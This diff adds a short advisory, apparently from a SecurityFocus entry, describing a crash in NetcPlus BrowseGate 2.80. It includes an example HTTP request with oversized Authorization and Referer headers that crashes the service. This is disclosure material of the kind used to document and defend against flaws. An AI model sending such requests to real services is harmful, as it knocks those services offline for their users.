@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/1702/info
+
+NetcPlus BrowseGate 2.80 will crash as the result of an invalid read error if a number of character strings consisting of 8 KB are inserted into GET request arguments through port 80.
+
+For example:
+
+GET / HTTP/1.0<cr>
+Authorization: Basic(8 KB string of characters)<cr>
+From: email@address.com<cr>
+If-Modified-Since: Sat, 29 Oct 1994 19:43:31 GMT<cr>
+Referer: http://referrer/(8 KB string of characters)<cr>
+UserAgent: Browser 1.1<cr>
+<cr><cr>
+
+will cause brwgate.exe to fail and a restart of the service is required in order to gain normal functionality.
